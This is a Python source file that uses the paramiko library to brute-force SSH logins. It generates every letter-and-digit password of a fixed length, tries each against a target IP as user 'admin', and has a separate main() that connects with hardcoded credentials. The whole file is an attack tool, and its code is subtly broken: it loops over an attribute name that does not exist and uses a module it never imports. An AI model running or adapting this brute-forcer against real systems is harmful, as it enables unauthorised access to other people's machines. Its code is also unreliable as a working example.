import paramiko
import itertools as it
from utils import timefunc


def create_client():
    client = paramiko.SSHClient()
    client_policy = paramiko.AutoAddPolicy()
    client.set_missing_host_key_policy(client_policy)
    return client

class Brutes:
    def __init__(self,char, length, ip):
        self.charset = char
        self.length = length
        self.ip = ip

    @timefunc
    def crackit(self, username):
        client = create_client()
        for guess in self.guesses:
            try:
                client.connect(self.ip, username=username, password=guess, timeout=0.05)
                return guess
            except paramiko.AuthenticationException as e:
                print('{} is not it.'.format(guess))
            finally:
                client.close()


    @property
    def guess(self):
        for guess in it.product(self.charset, repeat=self.length):
            yield ''.join(guess)



def RunBrutes():
    charset = string.ascii_letters + string.digits
    ip = '127.0.0.1' # Target
    brute = Brutes(charset, 4, ip)
    password = brute.crackit(username='admin') # Username
    if password:
        print('Found {}'.format(password))



def main():
    ip = '127.0.0.1'  # Set Target IP
    username = 'ubuntu'
    password = 'sulfur'
    timeout = 5
    client_policy = paramiko.AutoAddPolicy() # Set Policy for Paramiko
    client = paramiko.SSHClient();
    client.set_missing_host_key_policy(client_policy)
    client.connect(ip, username=username, password=password, timeout=timeout)
    print(client)



if __name__ == '__main__':
    main()
